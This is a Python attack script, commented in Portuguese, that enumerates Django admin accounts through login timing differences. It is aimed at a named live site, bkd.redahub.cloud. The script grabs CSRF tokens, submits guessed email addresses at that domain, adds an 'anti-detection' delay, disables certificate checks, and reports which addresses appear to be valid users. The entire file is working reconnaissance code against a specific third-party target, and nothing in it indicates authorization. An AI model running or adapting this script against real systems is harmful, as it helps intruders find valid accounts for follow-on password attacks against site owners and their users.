#!/usr/bin/env python3
"""
Django Admin User Enumeration via Timing Attacks
Target: https://bkd.redahub.cloud/admin/login/
Author: Neural-OffSec-Team
Date: 2025-11-11
"""

import requests
import re
import time
import statistics
from typing import List, Tuple

TARGET_URL = "https://bkd.redahub.cloud/admin/login/"
VERIFY_SSL = False
SAMPLES = 10  # Múltiplas medições para precisão

# Lista de emails para testar
TEST_EMAILS = [
    # Comuns REDAHUB
    "admin@redahub.cloud",
    "suporte@redahub.cloud",
    "contato@redahub.cloud",
    "tech@redahub.cloud",
    "dev@redahub.cloud",
    "info@redahub.cloud",
    "comercial@redahub.cloud",
    "vendas@redahub.cloud",
    # Genéricos
    "admin@admin.com",
    "root@localhost",
    "test@test.com",
    # Email inexistente (baseline)
    "nonexistent_user_123456789@invalid.local",
]


class DjangoUserEnumerator:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.verify = VERIFY_SSL
        self.baseline_time = None

    def get_csrf_token(self) -> str:
        """Extrai CSRF token"""
        response = self.session.get(self.target_url)
        match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
        return match.group(1) if match else None

    def measure_response_time(self, email: str, password: str = "invalid_password_xyz") -> float:
        """Mede tempo de resposta preciso"""
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            return -1

        data = {
            "username": email,
            "password": password,
            "csrfmiddlewaretoken": csrf_token,
            "next": "/admin/",
        }

        headers = {
            "Referer": self.target_url,
            "Content-Type": "application/x-www-form-urlencoded",
        }

        start_time = time.perf_counter()
        try:
            self.session.post(
                self.target_url,
                data=data,
                headers=headers,
                allow_redirects=False,
            )
            end_time = time.perf_counter()
            return end_time - start_time
        except Exception:
            return -1

    def analyze_user(self, email: str) -> Tuple[float, float, bool]:
        """Analisa um email com múltiplas medições"""
        print(f"[*] Testando: {email}... ", end="", flush=True)

        times = []
        for _ in range(SAMPLES):
            response_time = self.measure_response_time(email)
            if response_time > 0:
                times.append(response_time)
            time.sleep(0.2)  # Delay anti-detection

        if not times:
            print("ERRO")
            return 0, 0, False

        avg_time = statistics.mean(times)
        std_dev = statistics.stdev(times) if len(times) > 1 else 0

        # Comparar com baseline
        if self.baseline_time:
            diff = abs(avg_time - self.baseline_time)
            # Threshold: 2x desvio padrão ou >100ms de diferença
            is_valid = diff > (2 * std_dev) or diff > 0.1
            print(f"{avg_time:.3f}s (±{std_dev:.3f}s) - Diff: {diff:.3f}s {'✅ VÁLIDO' if is_valid else '❌'}")
            return avg_time, std_dev, is_valid
        else:
            print(f"{avg_time:.3f}s (±{std_dev:.3f}s) [BASELINE]")
            return avg_time, std_dev, False

    def run(self):
        """Executa user enumeration"""
        print("[*] Django Admin User Enumeration via Timing Attack")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Samples per email: {SAMPLES}")
        print(f"[*] Total emails to test: {len(TEST_EMAILS)}")
        print("-" * 70)

        results = []

        # 1. Estabelecer baseline com email inexistente
        print("\n[1] Estabelecendo baseline (usuário inexistente):")
        baseline_email = "nonexistent_user_123456789@invalid.local"
        baseline_avg, baseline_std, _ = self.analyze_user(baseline_email)
        self.baseline_time = baseline_avg

        # 2. Testar todos os emails
        print("\n[2] Testando emails candidatos:")
        for email in TEST_EMAILS:
            if email == baseline_email:
                continue
            avg_time, std_dev, is_valid = self.analyze_user(email)
            results.append((email, avg_time, std_dev, is_valid))

        # 3. Relatório final
        print("\n" + "=" * 70)
        print("[*] RELATÓRIO DE USER ENUMERATION")
        print("=" * 70)
        print(f"Baseline (inexistente): {self.baseline_time:.3f}s")
        print(f"\nEmails com timing suspeito (possível usuário válido):")

        valid_users = [r for r in results if r[3]]
        if valid_users:
            for email, avg, std, _ in valid_users:
                diff = abs(avg - self.baseline_time)
                print(f"  ✅ {email}")
                print(f"     Tempo: {avg:.3f}s (±{std:.3f}s)")
                print(f"     Diferença do baseline: {diff:.3f}s ({(diff/self.baseline_time)*100:.1f}%)")
        else:
            print("  ❌ Nenhum usuário válido detectado via timing attack")
            print("  ⚠️  Possíveis razões:")
            print("     - Django usando constant-time password hashing corretamente")
            print("     - Rate limiting introduzindo noise")
            print("     - Todos os emails testados são inválidos")

        # 4. Análise estatística
        print("\n[*] Análise Estatística:")
        all_times = [r[1] for r in results]
        if all_times:
            print(f"  Média geral: {statistics.mean(all_times):.3f}s")
            print(f"  Mediana: {statistics.median(all_times):.3f}s")
            print(f"  Desvio padrão: {statistics.stdev(all_times):.3f}s")
            print(f"  Min: {min(all_times):.3f}s | Max: {max(all_times):.3f}s")


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    enumerator = DjangoUserEnumerator(TARGET_URL)
    enumerator.run()
